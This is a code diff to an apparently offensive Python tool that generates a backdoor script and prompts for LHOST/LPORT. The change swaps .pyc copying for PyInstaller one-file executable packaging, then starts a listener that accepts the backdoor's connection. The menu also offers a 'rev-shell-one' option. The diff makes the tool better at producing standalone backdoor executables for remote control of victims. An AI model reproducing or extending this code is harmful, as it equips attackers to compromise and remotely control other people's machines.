@@ -1,3 +1,4 @@
+#!/usr/bin python3
 # Import Statements
 try:
     from termcolor import colored
@@ -15,7 +16,9 @@ try:
     import threading
     import readline
     import subprocess
-except:
+    import PyInstaller.__main__
+except Exception as e:
+    print(e)
     print("Failed To Import Some Dependencies Exitting.")
     exit(1)
 
@@ -49,14 +52,12 @@ class Tools:
         with open("tmp/backdoor.py", "w") as f:
             f.writelines(code)
         
+        print(srcp)
         py_compile.compile("tmp/backdoor.py")
-        try:
-            shutil.copy("tmp/__pycache__/backdoor.cpython-38.pyc", srcp)
-        except:
-            os.remove(os.path.join(srcp, "backdoor.cpython-38.pyc"))
-            shutil.copy("tmp/__pycache__/backdoor.cpython-38.pyc", srcp)
-
-        os.chmod(os.path.join(srcp, "backdoor.cpython-38.pyc"), 999)
+        PyInstaller.__main__.run([
+                "tmp/backdoor.py",
+                "--onefile"
+            ])
 
         server = bd_ser.Listener(LHOST, LPORT)
         server.accept_connection()
@@ -127,7 +128,7 @@ def HandleOptions(selected: str):
         LPORT = int(input(colored("LPORT > ", "magenta")))
         DESTINATION = input(colored("Enter Destination To Save The Backdoor Default is \".\" > ", "magenta"))
         if DESTINATION == "":
-            Tools.backdoor(LHOST, LPORT, LPORT)
+            Tools.backdoor(LHOST, LPORT)
         else:
             Tools.backdoor(LHOST, LPORT, srcp=DESTINATION)
     if selected == 'rev-shell-one':
